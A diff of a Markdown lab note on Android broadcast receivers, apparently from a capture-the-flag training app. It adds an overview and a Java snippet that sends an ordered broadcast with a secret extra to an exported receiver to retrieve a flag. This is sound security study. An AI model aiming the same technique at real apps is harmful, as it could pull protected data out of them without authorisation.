@@ -1,18 +1,45 @@
 # Broadcast Receiver 
+- [Overview](#overview)
+- [Ordered Broadcast](#ordered-broadcast)
 
-## Static Broadcast Receiver
+## Overview
+- There are two ways how broadcast receivers could be used by an app. First they could be exported via the AndroidManifest.xml with a `<receiver>` tag.
 
-- [ ] Verify the presence of the `<receiver>` tag in the `AndroidManifest.xml` file.
+- The other way is by dynamically registering a receiver class using `registerReceiver()`.
 
+> [!IMPORTANT]
+> Please keep the following in mind: you do not have the required privileges to send system broadcasts to applications or to specific broadcast receivers; however, execution can still reach the `else` branch of the logic.
 
-## Dynamic Broadcast Receiver
+## Ordered Broadcast
+- Send Ordered Broadcast and get results
+```java
+Intent intent = new Intent();
+        intent.setComponent(new ComponentName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.receivers.Flag17Receiver"
+        ));
 
-### Overview:
-Dynamic broadcast receivers are similar to static broadcast receivers but are only active while the application is running.
+        // Required secret
+        intent.putExtra("flag", "give-flag-17");
 
-- [ ] Verify the presence of the `registerReceiver()` function in the Java code.
+        sendOrderedBroadcast(
+                intent,
+                null,
+                new BroadcastReceiver() {
+                    @Override
+                    public void onReceive(Context context, Intent intent) {
+                        Bundle result = getResultExtras(false);
+                        if (result != null) {
+                            Log.i("FLAG17", "Success: " + result.getBoolean("success"));
+                            Log.i("FLAG17", "Flag: " + result.getString("flag"));
+                        }
+                    }
+                },
+                null,
+                RESULT_OK,
+                null,
+                null
+        );
 
-## Testing Procedure
-
-- Begin testing from the `onReceive()` function to ensure the broadcast receiver correctly handles the received intents.
-
+        finish();
+```
